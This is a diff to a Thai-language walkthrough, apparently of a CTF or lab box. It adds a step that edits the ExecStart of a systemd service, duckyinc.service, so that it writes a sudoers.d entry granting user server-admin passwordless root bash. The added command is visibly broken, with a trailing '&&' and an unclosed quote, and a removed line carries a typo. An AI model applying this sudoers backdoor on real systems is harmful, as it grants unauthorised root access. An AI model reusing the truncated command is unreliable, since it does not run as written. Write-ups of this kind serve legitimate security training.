@@ -297,7 +297,6 @@ sudoedit /etc/systemd/system/duckyinc.service
 
 ```bash
 sudo  systemctl daemon-reload
-sudo  systemctl restartduckyinc.service
 ```
 
 จากนั้นรีสตาร์ท service เพื่อให้โหลด config ใหม่:
@@ -307,5 +306,15 @@ sudo  systemctl restartduckyinc.service
 ```
 ![sudoedit](images/25.png)
 
+### ⚙️ แก้ไข Unit File เพื่อ Privilege Escalation
+
+- ทำการแก้ไขไฟล์ service เพื่อเพิ่มสิทธิ์ให้กับผู้ใช้ server-admin โดยให้สามารถรัน /bin/bash ด้วยสิทธิ์ root โดยไม่ต้องใช้รหัสผ่าน
+- ใน ExecStart ของ service ให้เพิ่มคำสั่งนี้:
+
+```bash
+/bin/bash -c "echo 'server-admin ALL=(ALL) NOPASSWD: /bin/bash' | sudo tee /etc/sudoers.d/server_admin_as_root &&
+```
+
+![sudoedit](images/26.png)
 
 
